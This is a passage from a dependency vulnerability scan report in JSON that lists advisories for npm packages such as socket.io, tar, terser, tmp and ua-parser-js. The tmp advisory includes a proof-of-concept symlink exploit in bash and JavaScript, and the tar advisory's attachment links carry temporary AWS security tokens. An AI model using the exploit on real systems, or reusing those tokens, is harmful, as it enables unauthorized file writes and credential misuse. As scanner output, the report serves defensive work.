`socket.io-parser@3.4.2`\n- https:\/\/github.com\/socketio\/socket.io-parser\/commit\/fb21e422fc193b34347395a33e0f625bebc09983, included in `socket.io-parser@3.3.3`\n\n### Dependency analysis for the `socket.io` package\n\n| `socket.io` version | `socket.io-parser` version | Covered? |\n|---------------------|---------------------------------------------------------------------------------------------------------|------------------------|\n| `4.5.2...latest` | `~4.2.0` ([ref](https:\/\/github.com\/socketio\/socket.io\/commit\/9890b036cf942f6b6ad2afeb6a8361c32cd5d528)) | Yes :heavy_check_mark: |\n| `4.1.3...4.5.1` | `~4.0.4` ([ref](https:\/\/github.com\/socketio\/socket.io\/commit\/7c44893d7878cd5bba1eff43150c3e664f88fb57)) | Yes :heavy_check_mark: |\n| `3.0.5...4.1.2` | `~4.0.3` ([ref](https:\/\/github.com\/socketio\/socket.io\/commit\/752dfe3b1e5fecda53dae899b4a39e6fed5a1a17)) | Yes :heavy_check_mark: |\n| `3.0.0...3.0.4` | `~4.0.1` ([ref](https:\/\/github.com\/socketio\/socket.io\/commit\/1af3267e3f5f7884214cf2ca4d5282d620092fb0)) | Yes :heavy_check_mark: |\n| `2.3.0...2.5.0` | `~3.4.0` ([ref](https:\/\/github.com\/socketio\/socket.io\/commit\/cf39362014f5ff13a17168b74772c43920d6e4fd)) | Yes :heavy_check_mark: |\n\n\n### Dependency analysis for the `socket.io-client` package\n\n| `socket.io-client` version | `socket.io-parser` version | Covered? |\n|----------------------------|----------------------------------------------------------------------------------------------------------------|------------------------------------|\n| `4.5.0...latest` | `~4.2.0` ([ref](https:\/\/github.com\/socketio\/socket.io-client\/commit\/b862924b7f1720979e5db2f0154906b305d420e3)) | Yes :heavy_check_mark: |\n| `4.3.0...4.4.1` | `~4.1.1` ([ref](https:\/\/github.com\/socketio\/socket.io-client\/commit\/91b948b8607166fcc79f028a6428819277214188)) | No, but the impact is very limited |\n| `3.1.0...4.2.0` | `~4.0.4` ([ref](https:\/\/github.com\/socketio\/socket.io-client\/commit\/5d9b4eb42b1f5778e6f033096694acb331b132c4)) | Yes :heavy_check_mark: |\n| `3.0.5` | `~4.0.3` ([ref](https:\/\/github.com\/socketio\/socket.io-client\/commit\/cf9fc358365cc15a41260a51dc186c881bf086ca)) | Yes :heavy_check_mark: |\n| `3.0.0...3.0.4` | `~4.0.1` ([ref](https:\/\/github.com\/socketio\/socket.io-client\/commit\/b7e07ba633ceb9c1dc94cc894c10b9bfca536c7a)) | Yes :heavy_check_mark: |\n| `2.2.0...2.5.0` | `~3.3.0` ([ref](https:\/\/github.com\/socketio\/socket.io-client\/commit\/06e9a4ca2621176c30c352b2ba8b34fa42b8d0ba)) | Yes :heavy_check_mark: |\n"},"partialFingerprints": {"vulnerabilityHash": "ac764722dc838d3b150c8e387149307f"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?socket.io-parser","index": 37 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/socket.io-parser@4.0.4"}]}]}, {"ruleId": "CVE-2023-32695","level": "warning","message": {"text": "CVE-2023-32695 - socket.io parser is a socket.io encoder and decoder written in JavaScript complying with version 5 of socket.io-protocol. A specially crafted Socket.IO packet can trigger an uncaught exception on the Socket.IO server, thus killing the Node.js process. A patch has been released in version 4.2.3.\n\n\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2023-32695 for details"},"partialFingerprints": {"vulnerabilityHash": "628dcffb3713e36d6d284bc3caa77f6a"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?socket.io-parser","index": 37 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/socket.io-parser@4.0.4"}]}]}, {"ruleId": "GHSA-cqmj-92xf-r6r9","level": "warning","message": {"text": "GHSA-cqmj-92xf-r6r9 - ### Impact\n\nA specially crafted Socket.IO packet can trigger an uncaught exception on the Socket.IO server, thus killing the Node.js process.\n\n```\nTypeError: Cannot convert object to primitive value\n       at Socket.emit (node:events:507:25)\n       at ...\/node_modules\/socket.io\/lib\/socket.js:531:14\n```\n\n### Patches\n\nA fix has been released today (2023\/05\/22):\n\n- https:\/\/github.com\/socketio\/socket.io-parser\/commit\/3b78117bf6ba7e99d7a5cfc1ba54d0477554a7f3, included in `socket.io-parser@4.2.3`\n- https:\/\/github.com\/socketio\/socket.io-parser\/commit\/2dc3c92622dad113b8676be06f23b1ed46b02ced, included in `socket.io-parser@3.4.3`\n\n\nAnother fix has been released for the `3.3.x` branch:\n\n- https:\/\/github.com\/socketio\/socket.io-parser\/commit\/ee006607495eca4ec7262ad080dd3a91439a5ba4, included in `socket.io-parser@3.3.4\n\n| `socket.io` version | `socket.io-parser` version                                                                              | Needs minor update?                  |\n|---------------------|---------------------------------------------------------------------------------------------------------|--------------------------------------|\n| `4.5.2...latest`    | `~4.2.0` ([ref](https:\/\/github.com\/socketio\/socket.io\/commit\/9890b036cf942f6b6ad2afeb6a8361c32cd5d528)) | `npm audit fix` should be sufficient |\n| `4.1.3...4.5.1`     | `~4.1.1` ([ref](https:\/\/github.com\/socketio\/socket.io\/commit\/7c44893d7878cd5bba1eff43150c3e664f88fb57)) | Please upgrade to `socket.io@4.6.x`  |\n| `3.0.5...4.1.2`     | `~4.0.3` ([ref](https:\/\/github.com\/socketio\/socket.io\/commit\/752dfe3b1e5fecda53dae899b4a39e6fed5a1a17)) | Please upgrade to `socket.io@4.6.x`  |\n| `3.0.0...3.0.4`     | `~4.0.1` ([ref](https:\/\/github.com\/socketio\/socket.io\/commit\/1af3267e3f5f7884214cf2ca4d5282d620092fb0)) | Please upgrade to `socket.io@4.6.x`  |\n| `2.3.0...2.5.0`     | `~3.4.0` ([ref](https:\/\/github.com\/socketio\/socket.io\/commit\/cf39362014f5ff13a17168b74772c43920d6e4fd)) | `npm audit fix` should be sufficient |\n\n\n### Workarounds\n\nThere is no known workaround except upgrading to a safe version.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open a discussion [here](https:\/\/github.com\/socketio\/socket.io\/discussions)\n\nThanks to [@rafax00](https:\/\/github.com\/rafax00) for the responsible disclosure.\n"},"partialFingerprints": {"vulnerabilityHash": "1f20ba1653c34f5da8bca73249d67360"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?socket.io-parser","index": 37 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/socket.io-parser@4.0.4"}]}]}, {"ruleId": "GHSA-25hc-qcg6-38wj","level": "warning","message": {"text": "GHSA-25hc-qcg6-38wj - ### Impact\n\nA specially crafted Socket.IO packet can trigger an uncaught exception on the Socket.IO server, thus killing the Node.js process.\n\n```\nnode:events:502\n    throw err; \/\/ Unhandled 'error' event\n    ^\n\nError [ERR_UNHANDLED_ERROR]: Unhandled error. (undefined)\n    at new NodeError (node:internal\/errors:405:5)\n    at Socket.emit (node:events:500:17)\n    at \/myapp\/node_modules\/socket.io\/lib\/socket.js:531:14\n    at process.processTicksAndRejections (node:internal\/process\/task_queues:77:11) {\n  code: 'ERR_UNHANDLED_ERROR',\n  context: undefined\n}\n```\n\n### Affected versions\n\n| Version range    | Needs minor update?                            |\n|------------------|------------------------------------------------|\n| `4.6.2...latest` | Nothing to do               |\n| `3.0.0...4.6.1`  | Please upgrade to `socket.io@4.6.2` (at least) |\n| `2.3.0...2.5.0`  | Please upgrade to `socket.io@2.5.1`            |\n\n### Patches\n\nThis issue is fixed by https:\/\/github.com\/socketio\/socket.io\/commit\/15af22fc22bc6030fcead322c106f07640336115, included in `socket.io@4.6.2` (released in May 2023).\n\nThe fix was backported in the 2.x branch today: https:\/\/github.com\/socketio\/socket.io\/commit\/d30630ba10562bf987f4d2b42440fc41a828119c\n\n### Workarounds\n\nAs a workaround for the affected versions of the `socket.io` package, you can attach a listener for the \"error\" event:\n\n```js\nio.on(\"connection\", (socket) => {\n  socket.on(\"error\", () => {\n    \/\/ ...\n  });\n});\n```\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open a discussion [here](https:\/\/github.com\/socketio\/socket.io\/discussions)\n\nThanks a lot to [Paul Taylor](https:\/\/github.com\/Y0ursTruly) for the responsible disclosure.\n\n### References\n\n- https:\/\/github.com\/socketio\/socket.io\/commit\/15af22fc22bc6030fcead322c106f07640336115\n- https:\/\/github.com\/socketio\/socket.io\/commit\/d30630ba10562bf987f4d2b42440fc41a828119c\n"},"partialFingerprints": {"vulnerabilityHash": "aba8ae375714831701f61b936e358696"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?socket.io","index": 38 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/socket.io@4.4.1"}]}]}, {"ruleId": "CVE-2024-38355","level": "warning","message": {"text": "CVE-2024-38355 - Socket.IO is an open source, real-time, bidirectional, event-based, communication framework. A specially crafted Socket.IO packet can trigger an uncaught exception on the Socket.IO server, thus killing the Node.js process. This issue is fixed by commit `15af22fc22` which has been included in `socket.io@4.6.2` (released in May 2023). The fix was backported in the 2.x branch as well with commit `d30630ba10`. Users are advised to upgrade. Users unable to upgrade may attach a listener for the \"error\" event to catch these errors.\n"},"partialFingerprints": {"vulnerabilityHash": "db764e86d51338c152218bf70000c47d"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?socket.io","index": 38 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/socket.io@4.4.1"}]}]}, {"ruleId": "CVE-2024-28863","level": "warning","message": {"text": "CVE-2024-28863 - node-tar is a Tar for Node.js. node-tar prior to version 6.2.1 has no limit on the number of sub-folders created in the folder creation process. An attacker who generates a large number of sub-folders can consume memory on the system running node-tar and even crash the Node.js client within few seconds of running it using a path with too many sub-folders inside. Version 6.2.1 fixes this issue by preventing extraction in excessively deep sub-folders."},"partialFingerprints": {"vulnerabilityHash": "282b0acb6252674271617d7bbcd7002f"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?tar","index": 39 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/tar@6.1.11"}]}]}, {"ruleId": "GHSA-f5x3-32g6-xq36","level": "warning","message": {"text": "GHSA-f5x3-32g6-xq36 - ## Description: \nDuring some analysis today on npm's `node-tar` package I came across the folder creation process, Basicly if you provide node-tar with a path like this `.\/a\/b\/c\/foo.txt` it would create every folder and sub-folder here a, b and c until it reaches the last folder to create `foo.txt`, In-this case I noticed that there's no validation at all on the amount of folders being created, that said we're actually able to CPU and memory consume the system running node-tar and even crash the nodejs client within few seconds of running it using a path with too many sub-folders inside\n\n## Steps To Reproduce:\nYou can reproduce this issue by downloading the tar file I provided in the resources and using node-tar to extract it, you should get the same behavior as the video\n\n## Proof Of Concept:\nHere's a [video](https:\/\/hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com\/3i7uojw8s52psar6pg8zkdo4h9io?response-content-disposition=attachment%3B%20filename%3D%22tar-dos-poc.webm%22%3B%20filename%2A%3DUTF-8%27%27tar-dos-poc.webm&response-content-type=video%2Fwebm&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSWWGDXHA%2F20240312%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240312T080103Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCID3xYDc6emXVPOg8iVR5dVk0u3gguTPIDJ0OIE%2BKxj17AiEAi%2BGiay1gGMWhH%2F031fvMYnSsa8U7CnpZpxvFAYqNRwgqsQUIQBADGgwwMTM2MTkyNzQ4NDkiDAaj6OgUL3gg4hhLLCqOBUUrOgWSqaK%2FmxN6nKRvB4Who3LIyzswFKm9LV94GiSVFP3zXYA480voCmAHTg7eBL7%2BrYgV2RtXbhF4aCFMCN3qu7GeXkIdH7xwVMi9zXHkekviSKZ%2FsZtVVjn7RFqOCKhJl%2FCoiLQJuDuju%2FtfdTGZbEbGsPgKHoILYbRp81K51zeRL21okjsOehmypkZzq%2BoGrXIX0ynPOKujxw27uqdF4T%2BF9ynodq01vGgwgVBEjHojc4OKOfr1oW5b%2FtGVV59%2BOBVI1hqIKHRG0Ed4SWmp%2BLd1hazGuZPvp52szmegnOj5qr3ubppnKL242bX%2FuAnQKzKK0HpwolqXjsuEeFeM85lxhqHV%2B1BJqaqSHHDa0HUMLZistMRshRlntuchcFQCR6HBa2c8PSnhpVC31zMzvYMfKsI12h4HB6l%2FudrmNrvmH4LmNpi4dZFcio21DzKj%2FRjWmxjH7l8egDyG%2FIgPMY6Ls4IiN7aR1jijYTrBCgPUUHets3BFvqLzHtPFnG3B7%2FYRPnhCLu%2FgzvKN3F8l38KqeTNMHJaxkuhCvEjpFB2SJbi2QZqZZbLj3xASqXoogzbsyPp0Tzp0tH7EKDhPA7H6wwiZukXfFhhlYzP8on9fO2Ajz%2F%2BTDkDjbfWw4KNJ0cFeDsGrUspqQZb5TAKlUge7iOZEc2TZ5uagatSy9Mg08E4nImBSE5QUHDc7Daya1gyqrETMDZBBUHH2RFkGA9qMpEtNrtJ9G%2BPedz%2FpPY1hh9OCp9Pg1BrX97l3SfVzlAMRfNibhywq6qnE35rVnZi%2BEQ1UgBjs9jD%2FQrW49%2FaD0oUDojVeuFFryzRnQxDbKtYgonRcItTvLT5Y0xaK9P0u6H1197%2FMk3XxmjD9%2Fb%2BvBjqxAQWWkKiIxpC1oHEWK9Jt8UdJ39xszDBGpBqjB6Tvt5ePAXSyX8np%2FrBi%2BAPx06O0%2Ba7pU4NmH800EVXxxhgfj9nMw3CeoUIdxorVKtU2Mxw%2FLaAiPgxPS4rqkt65NF7eQYfegcSYDTm2Z%2BHPbz9HfCaVZ28Zqeko6sR%2F29ML4bguqVvHAM4mWPLNDXH33mjG%2BuzLi8e1BF7tNveg2X9G%2FRdcMkojwKYbu6xN3M6aX2alQg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1e8235d885f1d61529b7d6b23ea3a0780c300c91d86e925dd8310d5b661ddbe2) show-casing the exploit: \n\n## Impact\n\nDenial of service by crashing the nodejs client when attempting to parse a tar archive, make it run out of heap memory and consuming server CPU and memory resources\n\n## Report resources\n[payload.txt](https:\/\/hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com\/1e83ayb5dd3350fvj3gst0mqixwk?response-content-disposition=attachment%3B%20filename%3D%22payload.txt%22%3B%20filename%2A%3DUTF-8%27%27payload.txt&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSWWGDXHA%2F20240312%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240312T080103Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCID3xYDc6emXVPOg8iVR5dVk0u3gguTPIDJ0OIE%2BKxj17AiEAi%2BGiay1gGMWhH%2F031fvMYnSsa8U7CnpZpxvFAYqNRwgqsQUIQBADGgwwMTM2MTkyNzQ4NDkiDAaj6OgUL3gg4hhLLCqOBUUrOgWSqaK%2FmxN6nKRvB4Who3LIyzswFKm9LV94GiSVFP3zXYA480voCmAHTg7eBL7%2BrYgV2RtXbhF4aCFMCN3qu7GeXkIdH7xwVMi9zXHkekviSKZ%2FsZtVVjn7RFqOCKhJl%2FCoiLQJuDuju%2FtfdTGZbEbGsPgKHoILYbRp81K51zeRL21okjsOehmypkZzq%2BoGrXIX0ynPOKujxw27uqdF4T%2BF9ynodq01vGgwgVBEjHojc4OKOfr1oW5b%2FtGVV59%2BOBVI1hqIKHRG0Ed4SWmp%2BLd1hazGuZPvp52szmegnOj5qr3ubppnKL242bX%2FuAnQKzKK0HpwolqXjsuEeFeM85lxhqHV%2B1BJqaqSHHDa0HUMLZistMRshRlntuchcFQCR6HBa2c8PSnhpVC31zMzvYMfKsI12h4HB6l%2FudrmNrvmH4LmNpi4dZFcio21DzKj%2FRjWmxjH7l8egDyG%2FIgPMY6Ls4IiN7aR1jijYTrBCgPUUHets3BFvqLzHtPFnG3B7%2FYRPnhCLu%2FgzvKN3F8l38KqeTNMHJaxkuhCvEjpFB2SJbi2QZqZZbLj3xASqXoogzbsyPp0Tzp0tH7EKDhPA7H6wwiZukXfFhhlYzP8on9fO2Ajz%2F%2BTDkDjbfWw4KNJ0cFeDsGrUspqQZb5TAKlUge7iOZEc2TZ5uagatSy9Mg08E4nImBSE5QUHDc7Daya1gyqrETMDZBBUHH2RFkGA9qMpEtNrtJ9G%2BPedz%2FpPY1hh9OCp9Pg1BrX97l3SfVzlAMRfNibhywq6qnE35rVnZi%2BEQ1UgBjs9jD%2FQrW49%2FaD0oUDojVeuFFryzRnQxDbKtYgonRcItTvLT5Y0xaK9P0u6H1197%2FMk3XxmjD9%2Fb%2BvBjqxAQWWkKiIxpC1oHEWK9Jt8UdJ39xszDBGpBqjB6Tvt5ePAXSyX8np%2FrBi%2BAPx06O0%2Ba7pU4NmH800EVXxxhgfj9nMw3CeoUIdxorVKtU2Mxw%2FLaAiPgxPS4rqkt65NF7eQYfegcSYDTm2Z%2BHPbz9HfCaVZ28Zqeko6sR%2F29ML4bguqVvHAM4mWPLNDXH33mjG%2BuzLi8e1BF7tNveg2X9G%2FRdcMkojwKYbu6xN3M6aX2alQg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bad9fe731f05a63a950f99828125653a8c1254750fe0ca7be882e89ecdd449ae)\n[archeive.tar.gz](https:\/\/hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com\/ymkuh4xnfdcf1soeyi7jc2x4yt2i?response-content-disposition=attachment%3B%20filename%3D%22archive.tar.gz%22%3B%20filename%2A%3DUTF-8%27%27archive.tar.gz&response-content-type=application%2Fx-tar&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSWWGDXHA%2F20240312%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240312T080103Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCID3xYDc6emXVPOg8iVR5dVk0u3gguTPIDJ0OIE%2BKxj17AiEAi%2BGiay1gGMWhH%2F031fvMYnSsa8U7CnpZpxvFAYqNRwgqsQUIQBADGgwwMTM2MTkyNzQ4NDkiDAaj6OgUL3gg4hhLLCqOBUUrOgWSqaK%2FmxN6nKRvB4Who3LIyzswFKm9LV94GiSVFP3zXYA480voCmAHTg7eBL7%2BrYgV2RtXbhF4aCFMCN3qu7GeXkIdH7xwVMi9zXHkekviSKZ%2FsZtVVjn7RFqOCKhJl%2FCoiLQJuDuju%2FtfdTGZbEbGsPgKHoILYbRp81K51zeRL21okjsOehmypkZzq%2BoGrXIX0ynPOKujxw27uqdF4T%2BF9ynodq01vGgwgVBEjHojc4OKOfr1oW5b%2FtGVV59%2BOBVI1hqIKHRG0Ed4SWmp%2BLd1hazGuZPvp52szmegnOj5qr3ubppnKL242bX%2FuAnQKzKK0HpwolqXjsuEeFeM85lxhqHV%2B1BJqaqSHHDa0HUMLZistMRshRlntuchcFQCR6HBa2c8PSnhpVC31zMzvYMfKsI12h4HB6l%2FudrmNrvmH4LmNpi4dZFcio21DzKj%2FRjWmxjH7l8egDyG%2FIgPMY6Ls4IiN7aR1jijYTrBCgPUUHets3BFvqLzHtPFnG3B7%2FYRPnhCLu%2FgzvKN3F8l38KqeTNMHJaxkuhCvEjpFB2SJbi2QZqZZbLj3xASqXoogzbsyPp0Tzp0tH7EKDhPA7H6wwiZukXfFhhlYzP8on9fO2Ajz%2F%2BTDkDjbfWw4KNJ0cFeDsGrUspqQZb5TAKlUge7iOZEc2TZ5uagatSy9Mg08E4nImBSE5QUHDc7Daya1gyqrETMDZBBUHH2RFkGA9qMpEtNrtJ9G%2BPedz%2FpPY1hh9OCp9Pg1BrX97l3SfVzlAMRfNibhywq6qnE35rVnZi%2BEQ1UgBjs9jD%2FQrW49%2FaD0oUDojVeuFFryzRnQxDbKtYgonRcItTvLT5Y0xaK9P0u6H1197%2FMk3XxmjD9%2Fb%2BvBjqxAQWWkKiIxpC1oHEWK9Jt8UdJ39xszDBGpBqjB6Tvt5ePAXSyX8np%2FrBi%2BAPx06O0%2Ba7pU4NmH800EVXxxhgfj9nMw3CeoUIdxorVKtU2Mxw%2FLaAiPgxPS4rqkt65NF7eQYfegcSYDTm2Z%2BHPbz9HfCaVZ28Zqeko6sR%2F29ML4bguqVvHAM4mWPLNDXH33mjG%2BuzLi8e1BF7tNveg2X9G%2FRdcMkojwKYbu6xN3M6aX2alQg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5e2c0d4b4de40373ac0fe91908c2659141a6dd4ab850271cc26042a3885c82ea)\n\n## Note\nThis report was originally reported to GitHub bug bounty program, they asked me to report it to you a month ago"},"partialFingerprints": {"vulnerabilityHash": "f99f6cad1fe2ac4c9c9fb68934380572"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?tar","index": 39 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/tar@6.1.11"}]}]}, {"ruleId": "CVE-2022-25858","level": "warning","message": {"text": "CVE-2022-25858 - The package terser before 4.8.1, from 5.0.0 and before 5.14.2 are vulnerable to Regular Expression Denial of Service (ReDoS) due to insecure usage of regular expressions.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2022-25858 for details"},"partialFingerprints": {"vulnerabilityHash": "5937072a8bf6ba51246b25b7238082fc"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?terser","index": 40 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/terser@5.10.0"}]}]}, {"ruleId": "GHSA-4wf5-vphf-c2xc","level": "warning","message": {"text": "GHSA-4wf5-vphf-c2xc - The package terser before 4.8.1, from 5.0.0 and before 5.14.2 are vulnerable to Regular Expression Denial of Service (ReDoS) due to insecure usage of regular expressions."},"partialFingerprints": {"vulnerabilityHash": "9b9ce12f49bfe180f85e568532c45bb5"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?terser","index": 40 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/terser@5.10.0"}]}]}, {"ruleId": "CVE-2025-54798","level": "warning","message": {"text": "CVE-2025-54798 - tmp is a temporary file and directory creator for node.js. In versions 0.2.3 and below, tmp is vulnerable to an arbitrary temporary file \/ directory write via symbolic link dir parameter. This is fixed in version 0.2.4."},"partialFingerprints": {"vulnerabilityHash": "9d4c0fcec245f787c8674eb559dee5dc"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?tmp","index": 41 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/tmp@0.2.1"}]}]}, {"ruleId": "GHSA-52f5-9888-hmc6","level": "warning","message": {"text": "GHSA-52f5-9888-hmc6 - ### Summary\n\n`tmp@0.2.3` is vulnerable to an Arbitrary temporary file \/ directory write via symbolic link `dir` parameter.\n\n\n### Details\n\nAccording to the documentation there are some conditions that must be held:\n\n```\n\/\/ https:\/\/github.com\/raszi\/node-tmp\/blob\/v0.2.3\/README.md?plain=1#L41-L50\n\nOther breaking changes, i.e.\n\n- template must be relative to tmpdir\n- name must be relative to tmpdir\n- dir option must be relative to tmpdir \/\/<-- this assumption can be bypassed using symlinks\n\nare still in place.\n\nIn order to override the system's tmpdir, you will have to use the newly\nintroduced tmpdir option.\n\n\n\/\/ https:\/\/github.com\/raszi\/node-tmp\/blob\/v0.2.3\/README.md?plain=1#L375\n* `dir`: the optional temporary directory that must be relative to the system's default temporary directory.\n     absolute paths are fine as long as they point to a location under the system's default temporary directory.\n     Any directories along the so specified path must exist, otherwise a ENOENT error will be thrown upon access, \n     as tmp will not check the availability of the path, nor will it establish the requested path for you.\n```\n\nRelated issue: https:\/\/github.com\/raszi\/node-tmp\/issues\/207.\n\n\nThe issue occurs because `_resolvePath` does not properly handle symbolic link when resolving paths:\n```js\n\/\/ https:\/\/github.com\/raszi\/node-tmp\/blob\/v0.2.3\/lib\/tmp.js#L573-L579\nfunction _resolvePath(name, tmpDir) {\n  if (name.startsWith(tmpDir)) {\n    return path.resolve(name);\n  } else {\n    return path.resolve(path.join(tmpDir, name));\n  }\n}\n```\n\nIf the `dir` parameter points to a symlink that resolves to a folder outside the `tmpDir`, it's possible to bypass the `_assertIsRelative` check used in `_assertAndSanitizeOptions`:\n```js\n\/\/ https:\/\/github.com\/raszi\/node-tmp\/blob\/v0.2.3\/lib\/tmp.js#L590-L609\nfunction _assertIsRelative(name, option, tmpDir) {\n  if (option === 'name') {\n    \/\/ assert that name is not absolute and does not contain a path\n    if (path.isAbsolute(name))\n      throw new Error(`${option} option must not contain an absolute path, found \"${name}\".`);\n    \/\/ must not fail on valid .<name> or ..<name> or similar such constructs\n    let basename = path.basename(name);\n    if (basename === '..' || basename === '.' || basename !== name)\n      throw new Error(`${option} option must not contain a path, found \"${name}\".`);\n  }\n  else { \/\/ if (option === 'dir' || option === 'template') {\n    \/\/ assert that dir or template are relative to tmpDir\n    if (path.isAbsolute(name) && !name.startsWith(tmpDir)) {\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${name}\".`);\n    }\n    let resolvedPath = _resolvePath(name, tmpDir); \/\/<--- \n    if (!resolvedPath.startsWith(tmpDir))\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${resolvedPath}\".`);\n  }\n}\n```\n\n\n### PoC\n\nThe following PoC demonstrates how writing a tmp file on a folder outside the `tmpDir` is possible.\nTested on a Linux machine.\n\n- Setup: create a symbolic link inside the `tmpDir` that points to a directory outside of it\n```bash\nmkdir $HOME\/mydir1\n\nln -s $HOME\/mydir1 ${TMPDIR:-\/tmp}\/evil-dir\n```\n\n- check the folder is empty:\n```bash\nls -lha $HOME\/mydir1 | grep \"tmp-\"\n```\n\n- run the poc\n```bash\nnode main.js\nFile:  \/tmp\/evil-dir\/tmp-26821-Vw87SLRaBIlf\ntest 1: ENOENT: no such file or directory, open '\/tmp\/mydir1\/tmp-[random-id]'\ntest 2: dir option must be relative to \"\/tmp\", found \"\/foo\".\ntest 3: dir option must be relative to \"\/tmp\", found \"\/home\/user\/mydir1\".\n```\n\n- the temporary file is created under `$HOME\/mydir1` (outside the `tmpDir`):\n```bash\nls -lha $HOME\/mydir1 | grep \"tmp-\"\n-rw------- 1 user user    0 Apr  X XX:XX tmp-[random-id]\n```\n\n\n- `main.js`\n```js\n\/\/ npm i tmp@0.2.3\n\nconst tmp = require('tmp');\n\nconst tmpobj = tmp.fileSync({ 'dir': 'evil-dir'});\nconsole.log('File: ', tmpobj.name);\n\ntry {\n    tmp.fileSync({ 'dir': 'mydir1'});\n} catch (err) {\n    console.log('test 1:', err.message)\n}\n\ntry {\n    tmp.fileSync({ 'dir': '\/foo'});\n} catch (err) {\n    console.log('test 2:', err.message)\n}\n\ntry {\n    const fs = require('node:fs');\n    const resolved = fs.realpathSync('\/tmp\/evil-dir');\n    tmp.fileSync({ 'dir': resolved});\n} catch (err) {\n    console.log('test 3:', err.message)\n}\n```\n\n\nA Potential fix could be to call `fs.realpathSync` (or similar) that resolves also symbolic links.\n```js\nfunction _resolvePath(name, tmpDir) {\n  let resolvedPath;\n  if (name.startsWith(tmpDir)) {\n    resolvedPath = path.resolve(name);\n  } else {\n    resolvedPath = path.resolve(path.join(tmpDir, name));\n  }\n  return fs.realpathSync(resolvedPath);\n}\n```\n\n\n### Impact\n\nArbitrary temporary file \/ directory write via symlink"},"partialFingerprints": {"vulnerabilityHash": "f379d524d737db86be385fc035951394"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?tmp","index": 41 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/tmp@0.2.1"}]}]}, {"ruleId": "CVE-2022-25927","level": "warning","message": {"text": "CVE-2022-25927 - ua-parser-js - Regular Expression Denial of Service (ReDoS) [ CVE-2022-25927 ]\n\nua-parser-js - Regular Expression Denial of Service (ReDoS) [ CVE-2022-25927 ]"},"partialFingerprints": {"vulnerabilityHash": "c496621e378bac172f5ccf8263fad61a"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?ua-parser-js","index": 42 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/ua-parser-js@0.7.31"}]}]}, {"ruleId": "GHSA-fhg7-m89q-25r3","level": "warning","message": {"text": "GHSA-fhg7-m89q-25r3 - ### Description:\nA regular expression denial of service (ReDoS) vulnerability has been discovered in `ua-parser-js`.\n\n### Impact:\nThis vulnerability bypass the library's `MAX_LENGTH` input limit prevention. By crafting a very-very-long user-agent string with specific pattern, an attacker can turn the script to get stuck processing for a very long time which results in a denial of service (DoS) condition.\n\n### Affected Versions:\nAll versions of the library prior to version `0.7.33` \/ `1.0.33`.\n\n### Patches:\nA patch has been released to remove the vulnerable regular expression, update to version `0.7.33` \/ `1.0.33` or later.\n\n### References:\n[Regular expression Denial of Service - ReDoS](https:\/\/owasp.org\/www-community\/attacks\/Regular_expression_Denial_of_Service_-_ReDoS)\n\n### Credits:\nThanks to @Snyk who first reported the issue."},"partialFingerprints": {"vulnerabilityHash": 